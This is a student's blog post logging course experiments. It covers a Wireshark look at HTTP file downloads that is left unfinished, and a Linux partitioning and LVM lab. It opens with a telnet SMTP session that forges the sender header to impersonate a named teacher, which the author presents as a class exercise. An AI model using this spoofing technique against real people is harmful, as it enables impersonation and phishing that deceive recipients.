<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="utf-8">
    
    <link rel="canonical" href="https://tjuyjn.top/2019/10/03/linux文件管理实验/">
    
    
    <title>一些有趣的实验 | Anti-entropy&#39;s blog | 向一切虚伪的美好宣战</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="keywords" content="linux,文件系统,OS,c语言,网络,smtp,Reverse,汇编">
    <link rel="shortcut icon" href="/img/favicon.ico">
    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.css">
    <link rel="stylesheet" href="/css/style.css?v=1.4.2">
    
    <script type="text/javascript">
        // Data Center
        var DC = {
            reward:	true,
            lv: JSON.parse('{"enable":null,"app_id":"falsee1f779yetMaV1lNERajntYJH-gzGzoHsz","app_key":"CGROdujMx4Hw9l84Eysyhp7D","icon":true}'),
            v: JSON.parse('{"enable":true,"appid":"w6aWfPRvBTtEbBcUQVnWa1fl-MdYXbMMI","appkey":"96PaRwN0DWkNUdwQrWx3Ff7g","notify":true,"verify":true,"placeholder":"来和希儿一起玩吧 -- 记得告诉希儿你的昵称和邮箱哟","avatar":"retro"}'),
            g: JSON.parse('{"enable":false,"lazy":true,"owner":"codefine","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
            d: JSON.parse('{"app_id":null}')
        };
    </script>
    <script type="text/javascript">
        window.lazyScripts=[];
    </script>
    

    <script>
        var _hmt = _hmt || [];
        (function() {
          var hm = document.createElement("script");
          hm.src = "https://hm.baidu.com/hm.js?85ac030db207eb5660d0fd7b00b2205d";
          var s = document.getElementsByTagName("script")[0]; 
          s.parentNode.insertBefore(hm, s);
        })();
    </script>
    
        <!-- live2d css -->
        <style>
            .live2d-widget-dialog-container {
                width: 300px;
                height: 120px;
                position: absolute;
                bottom: 65%;
                right: 0px;
                transform-origin: right;
                padding: 12px;
                box-sizing: border-box;
                -webkit-font-smoothing: antialiased;
            }
            .live2d-widget-dialog {
                width: 100%;
                height: 100%;
                color: #917159;
                font-size: 16px;
                padding: 12px;
                border: 2px solid rgb(236, 203, 180);
                background: rgb(252, 248, 244);
                box-sizing: border-box;
                border-radius: 10px;
                transform: rotate(-2deg);
                opacity: 0;
                transition: 200ms opacity;
                box-shadow: rgba(0, 0, 0, 0.12) 0px 1px 6px, rgba(0, 0, 0, 0.12) 0px 1px 4px;
                animation: live2d-widget-dialog-tingle 4s ease-in-out 0s infinite alternate;
            }
            @keyframes live2d-widget-dialog-tingle {
                0% { transform: translate(-1px, 1.5px) rotate(-2deg); }
                100% { transform: translate(1px, -1.5px) rotate(2deg); }
            }
        </style>
    
        <!--- live2d js -->
        <script src="http://188.131.227.20:999/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script>
        <script>L2Dwidget.init({"pluginRootPath":"http://188.131.227.20:999/live2dw/","pluginJsPath":"http://188.131.227.20:999/lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/Epsilon2.1.model.json"},"display":{"position":"right","width":300,"height":400},"mobile":{"show":false},"log":false});</script>
        <div id="live2d-widget" class="live2d-widget-container" style="position: fixed; right: 0px; bottom: -20px; width: 300px; height: 400px; z-index: 99999; opacity: 1; pointer-events: none;"><canvas id="live2dcanvas" width="600" height="800" style="position: absolute; left: 0px; top: 0px; width: 300px; height: 400px;"></canvas></div>
        <script>
            var imageArr=[];
        </script>
        
</head>



<body>
    <div id="loading" class="active"></div>

    <aside id="menu" class="hide">
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap">
      
      <img src="/img/brand.jpg" class="brand-bg">
      
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">Anti-entropy</h5>
          <a href="mailto:1348651580@qq.com" title="1348651580@qq.com" class="mail">
            
              <span>1</span>
            
              <span>3</span>
            
              <span>4</span>
            
              <span>8</span>
            
              <span>6</span>
            
              <span>5</span>
            
              <span>1</span>
            
              <span>5</span>
            
              <span>8</span>
            
              <span>0</span>
            
              <span>@</span>
            
              <span>q</span>
            
              <span>q</span>
            
              <span>.</span>
            
              <span>c</span>
            
              <span>o</span>
            
              <span>m</span>
            
          </a>
        </hgroup>
        
        <ul class="menu-link">
          
              <li>
                <a href="https://github.com/anti-entropy123/" target="_blank">
                  <i class="icon icon-lg icon-github"></i>
                </a>
              </li>
            
        </ul>
        
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
          <div id="binft" style=" text-align:center;">
              <script>
                var binft = function (r) {
                  function t() {
                    return b[Math.floor(Math.random() * b.length)]
                  }  
                  function e() {
                    return String.fromCharCode(94 * Math.random() + 33)
                  }
                  function n(r) {
                    for (var n = document.createDocumentFragment(), i = 0; r > i; i++) {
                      var l = document.createElement("span");
                      l.textContent = e(), l.style.color = t(), n.appendChild(l)
                    }
                    return n
                  }
                  function i() {
                    var t = o[c.skillI];
                    c.step ? c.step-- : (c.step = g, c.prefixP < l.length ? (c.prefixP >= 0 && (c.text += l[c.prefixP]), c.prefixP++) : "forward" === c.direction ? c.skillP < t.length ? (c.text += t[c.skillP], c.skillP++) : c.delay ? c.delay-- : (c.direction = "backward", c.delay = a) : c.skillP > 0 ? (c.text = c.text.slice(0, -1), c.skillP--) : (c.skillI = (c.skillI + 1) % o.length, c.direction = "forward")), r.textContent = c.text, r.appendChild(n(c.prefixP < l.length ? Math.min(s, s + c.prefixP) : Math.min(s, t.length - c.skillP))), setTimeout(i, d)
                  }
                  var l = "",
                  o = ["孤独是常态,", "寂寞是病态",
                      "孤独使我自由,","寂寞让我作呕",
                      "为守护所有美好而战,","向一切虚伪的美好宣战",
                      "don't be sorry,","be better",
                      "伤痕是我的勋章",
                      "但置我于低谷者,","必将助我以崛起",
                      "但置我于死地者,","必将赐我以后生",
                      "行于黑暗, 侍奉光明","万物皆虚, 万事皆允",
                      "天生我材必有用,","千金散尽还复来"
                      ].map(function (r) {
                  return r + ""
                  }),
                  a = 2,
                  g = 1,
                  s = 5,
                  d = 75,
                  b = ["rgb(110,64,170)", "rgb(150,61,179)", "rgb(191,60,175)", "rgb(228,65,157)", "rgb(254,75,131)", "rgb(255,94,99)", "rgb(255,120,71)", "rgb(251,150,51)", "rgb(226,183,47)", "rgb(198,214,60)", "rgb(175,240,91)", "rgb(127,246,88)", "rgb(82,246,103)", "rgb(48,239,130)", "rgb(29,223,163)", "rgb(26,199,194)", "rgb(35,171,216)", "rgb(54,140,225)", "rgb(76,110,219)", "rgb(96,84,200)"],
                  c = {
                    text: "",
                    prefixP: -s,
                    skillI: 0,
                    skillP: 0,
                    direction: "forward",
                    delay: a,
                    step: g
                  };
                  i()
                  };
                  binft(document.getElementById('binft'));
              </script>
            </div>
        
            <li class="">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                主页
              </a>
            </li>
        
            <li class="">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                标签
              </a>
            </li>
        
            <li class="">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                文章
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row clearfix">
        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">
            <span>一些有趣的实验</span>
            
        </div>
        
        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
            <i class="icon icon-lg icon-search"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">
    <img src="/img/banner.jpg" class="header-bg">
    <div class="container fade-scale">
        <h1 class="title">一些有趣的实验</h1>
        <h5 class="subtitle">
            
                <time datetime="2019-10-03T09:25:32.000Z" itemprop="datePublished" class="page-time">
  2019-10-03
</time>


            
        </h5>
        
    </div>
    

</header>

<div id="site_search">
    <div class="search-title clearfix">
        <span class="pull-left">
          <i class="icon icon-lg icon-search"></i>
        </span>
        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
          <i class="icon icon-lg icon-close"></i>
        </a>
    </div>
    <div id="local-search-result"></div>
</div>


<div class="container body-wrap">
    <article id="post-linux文件管理实验"
  class="post-article article-type-post" itemprop="blogPost">
    <div class="post-card">
        <h1 class="post-card-title">一些有趣的实验</h1>
        <div class="post-meta">
            <time class="post-time" title="2019-10-03 17:25:32" datetime="2019-10-03T09:25:32.000Z"  itemprop="datePublished">2019-10-03</time>

            


            

            
    <span class="leancloud-comment">
        <i class="icon icon-comment-o"></i>
        <a href="/2019/10/03/linux文件管理实验/#comment">
            <span class="valine-comment-count" data-xid="/2019/10/03/linux文件管理实验/"></span>
        </a>
    </span>



            
        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            
            <p>课上老师布置的一些实验的记录.</p>
<a id="more"></a>
<h1 id="实验合集"><a href="#实验合集" class="headerlink" title="实验合集"></a>实验合集</h1><h2 id="计算机网络"><a href="#计算机网络" class="headerlink" title="计算机网络"></a>计算机网络</h2><h3 id="smtp-发送伪造邮件"><a href="#smtp-发送伪造邮件" class="headerlink" title="smtp 发送伪造邮件"></a>smtp 发送伪造邮件</h3><p>计网老师布置的一个小任务 : 伪装<code>ligang</code>老师给他发个邮件. </p>
<p>通过telnet与smtp服务器进行命令行交互, 手工编写邮件内容, 就可以设置虚假的发件人信息.</p>
<p>以下演示在<code>Windows10 cmd</code>中.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&gt; telnet</span><br><span class="line">&gt; o smtp.qq.com 587</span><br><span class="line">220 smtp.qq.com Esmtp QQ Mail Server </span><br><span class="line">&gt; helo smtp</span><br><span class="line">250 smtp.qq.com                    </span><br><span class="line">&gt; starttls  </span><br><span class="line">220 Ready to start TLS             </span><br><span class="line">&gt; auth login                       </span><br><span class="line">334 VXNlcm5hbWU6   </span><br><span class="line">&gt; MTM0ODY1MTU4MEBxcS5jb20=  <span class="comment"># qq邮箱的base64编码</span></span><br><span class="line">334 UGFzc3dvcmQ6                  </span><br><span class="line">&gt; ***************   <span class="comment"># qq邮箱授权码的base64编码              </span></span><br><span class="line">235 Authentication successful     </span><br><span class="line">&gt; mail from:&lt;1348651580@qq.com&gt;            </span><br><span class="line">250 Ok       </span><br><span class="line">&gt; rcpt to:&lt;3018******@tju.edu.cn&gt;          </span><br><span class="line">250 Ok       </span><br><span class="line">&gt; data </span><br><span class="line">354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;      </span><br><span class="line">&gt; from:ligang@tju.edu.cn            </span><br><span class="line">&gt; to:&lt;3018******@tju.edu.cn&gt;</span><br><span class="line">&gt; subject:i want to play a game    </span><br><span class="line">&gt; </span><br><span class="line">&gt; we will we will rockyou.</span><br><span class="line">&gt; .</span><br><span class="line">250 Ok: queued as</span><br></pre></td></tr></table></figure>

<p>按照上面的输入成功后, 会有如下的效果.</p>
<figure class="image-box">
                <a rel=一些有趣的实验 href="http://188.131.227.20:999/picture/smtp.png" title="" data-fancybox="images"><img src="http://188.131.227.20:999/picture/smtp.png" alt title class></a>
                <p></p>
            </figure>

<p>可以发现, 发件人成功的显示成了<code>ligang</code>.</p>
<p>不过细心的你(口区)应该已经发现了, 最后竟然显示了我真实的邮箱 ! ! !</p>
<p>要想去掉这个代发的字段也有办法, 那就是需要搭建自己的smtp服务器.( 正在尝试中 … )</p>
<p>不过这种欺骗手段似乎只要查看了邮件头就没有任何效果了, 只能拿去吓唬吓唬其它专业的同学们, 哈哈哈.</p>
<h3 id="http-下的文件下载分析"><a href="#http-下的文件下载分析" class="headerlink" title="http 下的文件下载分析"></a>http 下的文件下载分析</h3><ul>
<li>实验目的 : <ul>
<li>抓包分析 http 下载文件的细节</li>
<li>思考迅雷下载实现加速, 断点续传等功能的原理</li>
</ul>
</li>
</ul>
<h4 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h4><p>为了便于控制和能省流量, 我用 Apache 在本地(Windows)启动一个web服务器, 并将一个约 74MB 的文件放置于网站根目录下供我模拟下载.</p>
<p>然后使用<code>wireshark</code>捕获<code>Npcap Loopback Adapter</code>的数据包. 很快我就找到了下载文件的<code>http.GET请求包</code></p>
<p>但是当我追踪这个http流的时候, 发现竟然只有一个http数据包. </p>
<p><a rel=一些有趣的实验 href="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/stream2.png" title="" data-fancybox="images"><img src="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/stream2.png" alt></a></p>
<p>于是我尝试追踪了下其他的tcp数据包, 根据数据包的目的端口号(可以根据刚才的Get请求得到)和数据包的大小(下载文件的响应包应该会较大). 最终追踪到了正确的tcp流. </p>
<p><a rel=一些有趣的实验 href="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/stream3.png" title="" data-fancybox="images"><img src="https://hexo-blog-1258787237.cos.ap-beijing.myqcloud.com/hexo-img/stream3.png" alt></a></p>
<p>第一行的状态行<code>HTTP/1.1 200 OK</code>, 可以判断出数据应该也是使用http协议传输到客户端, 但是<code>wireshark</code>为啥不能追踪 http流 还不是很清楚.</p>
<p>从 <code>RESPONSE</code> 包的 <code>HEAD</code> 中, 有 <code>Content-Length: 76559956</code> 这么一项. 因为 76559956 / (1000 * 1000) = 76.5, 而我下载的文件大小是 74MB , 也就是这个参数的单位是 byte.</p>
<p>然而在</p>
<p>(未完待续)</p>
<h2 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h2><h3 id="linux-文件管理系统实验记录"><a href="#linux-文件管理系统实验记录" class="headerlink" title="linux 文件管理系统实验记录"></a>linux 文件管理系统实验记录</h3><ul>
<li>环境 : Ubuntu 16.04 (VMware Workstation 15 pro)</li>
<li>实验目标 : 使用命令行管理文件系统</li>
</ul>
<h4 id="分配虚拟硬盘"><a href="#分配虚拟硬盘" class="headerlink" title="分配虚拟硬盘"></a>分配虚拟硬盘</h4><p>虚拟机关闭时, 在VMware的<code>编辑虚拟机设置</code>里添加两个新的硬盘, 各10G.</p>
<p>完成后可以打开虚拟机确认:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">yjn@yjn-virtual-machine:~$ sudo fdisk -l</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disk /dev/sdb: 10 GiB, 10737418240 bytes, 20971520 sectors</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disk /dev/sdc: 10 GiB, 10737418240 bytes, 20971520 sectors</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br></pre></td></tr></table></figure>

<h4 id="创建和扩大文件系统和相关逻辑卷管理"><a href="#创建和扩大文件系统和相关逻辑卷管理" class="headerlink" title="创建和扩大文件系统和相关逻辑卷管理"></a>创建和扩大文件系统和相关逻辑卷管理</h4><h5 id="使用fdisk将sdb分出分区"><a href="#使用fdisk将sdb分出分区" class="headerlink" title="使用fdisk将sdb分出分区"></a>使用fdisk将sdb分出分区</h5><ul>
<li>sdb1:主分区, 4G  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">yjn@yjn-virtual-machine:/dev$ sudo fdisk /dev/sdb</span><br><span class="line"></span><br><span class="line">Welcome to fdisk (util-linux 2.27.1).</span><br><span class="line">Changes will remain <span class="keyword">in</span> memory only, until you decide to write them.</span><br><span class="line">Be careful before using the write <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">Device does not contain a recognized partition table.</span><br><span class="line">Created a new DOS disklabel with disk identifier 0x7ae8300a.</span><br><span class="line"></span><br><span class="line">命令(输入 m 获取帮助)： n</span><br><span class="line">Partition <span class="built_in">type</span></span><br><span class="line">p   primary (0 primary, 0 extended, 4 free)</span><br><span class="line">e   extended (container <span class="keyword">for</span> logical partitions)</span><br><span class="line">Select (default p): p</span><br><span class="line">分区号 (1-4, default 1): </span><br><span class="line">First sector (2048-20971519, default 2048): </span><br><span class="line">Last sector, +sectors or +size&#123;K,M,G,T,P&#125; (2048-20971519, default 20971519): +4G</span><br><span class="line"></span><br><span class="line">Created a new partition 1 of <span class="built_in">type</span> <span class="string">'Linux'</span> and of size 4 GiB.</span><br></pre></td></tr></table></figure>


</li>
</ul>
<ul>
<li>sdb2: 扩展分区, 6G.  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">命令(输入 m 获取帮助)： n</span><br><span class="line">Partition <span class="built_in">type</span></span><br><span class="line">p   primary (1 primary, 0 extended, 3 free)</span><br><span class="line">e   extended (container <span class="keyword">for</span> logical partitions)</span><br><span class="line">Select (default p): e</span><br><span class="line">分区号 (2-4, default 2): </span><br><span class="line">First sector (8390656-20971519, default 8390656): </span><br><span class="line">Last sector, +sectors or +size&#123;K,M,G,T,P&#125; (8390656-20971519, default 20971519): </span><br><span class="line"></span><br><span class="line">Created a new partition 2 of <span class="built_in">type</span> <span class="string">'Extended'</span> and of size 6 GiB.</span><br></pre></td></tr></table></figure>


</li>
</ul>
<ul>
<li>sdb5, sdb6逻辑分区, 各3G  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">命令(输入 m 获取帮助)： n</span><br><span class="line">All space <span class="keyword">for</span> primary partitions is <span class="keyword">in</span> use.</span><br><span class="line">Adding logical partition 5</span><br><span class="line">First sector (8392704-20971519, default 8392704): </span><br><span class="line">Last sector, +sectors or +size&#123;K,M,G,T,P&#125; (8392704-20971519, default 20971519): +3G</span><br><span class="line"></span><br><span class="line">Created a new partition 5 of <span class="built_in">type</span> <span class="string">'Linux'</span> and of size 3 GiB.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">命令(输入 m 获取帮助)： n</span><br><span class="line">All space <span class="keyword">for</span> primary partitions is <span class="keyword">in</span> use.</span><br><span class="line">Adding logical partition 6</span><br><span class="line">First sector (14686208-20971519, default 14686208): </span><br><span class="line">Last sector, +sectors or +size&#123;K,M,G,T,P&#125; (14686208-20971519, default 20971519): +3G</span><br><span class="line"></span><br><span class="line">Created a new partition 6 of <span class="built_in">type</span> <span class="string">'Linux'</span> and of size 3 GiB.</span><br><span class="line"></span><br><span class="line">命令(输入 m 获取帮助)： w</span><br><span class="line"></span><br><span class="line">The partition table has been altered.</span><br><span class="line">Calling ioctl() to re-read partition table.</span><br><span class="line">Syncing disks.</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h5 id="将sdb6-和-sdc-初始化为物理卷-PV"><a href="#将sdb6-和-sdc-初始化为物理卷-PV" class="headerlink" title="将sdb6 和 sdc 初始化为物理卷(PV)"></a>将sdb6 和 sdc 初始化为物理卷(PV)</h5><p>这里有个小插曲, 我的机器中 pvcreate 工具没有安装.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">yjn@yjn-virtual-machine:/dev$ sudo pvcreate /dev/sdb6</span><br><span class="line">sudo: pvcreate：找不到命令</span><br><span class="line"><span class="comment"># 安装 lvm2 即可</span></span><br><span class="line">yjn@yjn-virtual-machine:/dev$ sudo apt-get install lvm2</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:/dev$ sudo pvcreate /dev/sdb6</span><br><span class="line">  Physical volume <span class="string">"/dev/sdb6"</span> successfully created.</span><br><span class="line">yjn@yjn-virtual-machine:/dev$ sudo pvcreate /dev/sdc</span><br><span class="line">  Physical volume <span class="string">"/dev/sdc"</span> successfully createdyjn</span><br><span class="line">  </span><br><span class="line">@yjn-virtual-machine:/dev$ sudo pvs</span><br><span class="line">PV         VG Fmt  Attr PSize  PFree </span><br><span class="line">/dev/sdb6     lvm2 ---  &lt;3.00g &lt;3.00g</span><br><span class="line">/dev/sdc      lvm2 ---  10.00g 10.00g</span><br></pre></td></tr></table></figure>

<h5 id="将-sdb6-和-sdc-加入卷组-VG-vg00-中"><a href="#将-sdb6-和-sdc-加入卷组-VG-vg00-中" class="headerlink" title="将 sdb6 和 sdc 加入卷组(VG) vg00 中"></a>将 sdb6 和 sdc 加入卷组(VG) vg00 中</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">yjn@yjn-virtual-machine:/dev$ sudo vgcreate vg00 /dev/sdb6</span><br><span class="line">  Volume group <span class="string">"vg00"</span> successfully created</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:/dev$ sudo vgex vg00 </span><br><span class="line">vgexport  vgextend  </span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:/dev$ sudo vgextend vg00 /dev/sdc </span><br><span class="line">  Volume group <span class="string">"vg00"</span> successfully extended</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:/dev$ sudo vgs</span><br><span class="line">  VG   <span class="comment">#PV #LV #SN Attr   VSize  VFree </span></span><br><span class="line">  vg00   2   0   0 wz--n- 12.99g 12.99g</span><br></pre></td></tr></table></figure>

<h5 id="在vg00-中创建逻辑卷-LV-lv00-初始大小为-10G"><a href="#在vg00-中创建逻辑卷-LV-lv00-初始大小为-10G" class="headerlink" title="在vg00 中创建逻辑卷(LV)lv00, 初始大小为 10G"></a>在vg00 中创建逻辑卷(LV)lv00, 初始大小为 10G</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">yjn@yjn-virtual-machine:/dev$ sudo vgs</span><br><span class="line">  VG   <span class="comment">#PV #LV #SN Attr   VSize  VFree </span></span><br><span class="line">  vg00   2   0   0 wz--n- 12.99g 12.99g</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:/dev$ sudo lvcreate -L 10G -n lv00 /dev/vg00</span><br><span class="line">  Logical volume <span class="string">"lv00"</span> created.</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:/dev$ sudo lvs</span><br><span class="line">  LV   VG   Attr       LSize  Pool Origin Data%  Meta%  Move Log Cpy%Sync Convert</span><br><span class="line">  lv00 vg00 -wi<span class="_">-a</span>----- 10.00g</span><br></pre></td></tr></table></figure>

<h5 id="在lv00-中创建文件系统并装载"><a href="#在lv00-中创建文件系统并装载" class="headerlink" title="在lv00 中创建文件系统并装载"></a>在lv00 中创建文件系统并装载</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">yjn@yjn-virtual-machine:/dev$ sudo mkfs.ext4 /dev/vg00/lv00</span><br><span class="line">mke2fs 1.42.13 (17-May-2015)</span><br><span class="line">Creating filesystem with 2621440 4k blocks and 655360 inodes</span><br><span class="line">Filesystem UUID: 0cb50d90-490e-4413-b702-1187b48d10fc</span><br><span class="line">Superblock backups stored on blocks: </span><br><span class="line">	32768, 98304, 163840, 229376, 294912, 819200, 884736, 1605632</span><br><span class="line"></span><br><span class="line">Allocating group tables: 完成                            </span><br><span class="line">正在写入inode表: 完成                            </span><br><span class="line">Creating journal (32768 blocks): 完成</span><br><span class="line">Writing superblocks and filesystem accounting information: 完成 </span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~/OS$ sudo mkdir data</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~/OS$ sudo mount /dev/vg00/lv00 data</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~/OS/data$ ls</span><br><span class="line">lost+found</span><br></pre></td></tr></table></figure>

<p>我将文件系统挂在了 <code>OS/data/</code> 这个文件夹中.</p>
<h5 id="在文件系统中创建一个-8G-的大文件"><a href="#在文件系统中创建一个-8G-的大文件" class="headerlink" title="在文件系统中创建一个 8G 的大文件"></a>在文件系统中创建一个 8G 的大文件</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">yjn@yjn-virtual-machine:~/OS/data$ sudo dd <span class="keyword">if</span>=/dev/zero of=/home/yjn/OS/data/bigfile1 bs=1M count=8192</span><br><span class="line">记录了8192+0 的读入</span><br><span class="line">记录了8192+0 的写出</span><br><span class="line">8589934592 bytes (8.6 GB, 8.0 GiB) copied, 12.1378 s, 708 MB/s</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~/OS/data$ ls -lh</span><br><span class="line">总用量 8.1G</span><br><span class="line">-rw-r--r-- 1 root root 8.0G 10月  3 18:29 bigfile1</span><br><span class="line">drwx------ 2 root root  16K 10月  3 18:24 lost+found</span><br><span class="line"></span><br><span class="line">yjn@yjn-virtual-machine:~/OS/data$ df -h</span><br><span class="line">文件系统               容量  已用  可用 已用% 挂载点</span><br><span class="line">udev                   1.5G     0  1.5G    0% /dev</span><br><span class="line">tmpfs                  300M  8.9M  291M    3% /run</span><br><span class="line">/dev/sda1               17G  4.6G   12G   30% /</span><br><span class="line">tmpfs                  1.5G  132K  1.5G    1% /dev/shm</span><br><span class="line">tmpfs                  5.0M  4.0K  5.0M    1% /run/lock</span><br><span class="line">tmpfs                  1.5G     0  1.5G    0% /sys/fs/cgroup</span><br><span class="line">tmpfs                  300M   40K  300M    1% /run/user/1000</span><br><span class="line">/dev/mapper/vg00-lv00  9.8G  8.1G  1.2G   88% /home/yjn/OS/data</span><br></pre></td></tr></table></figure>

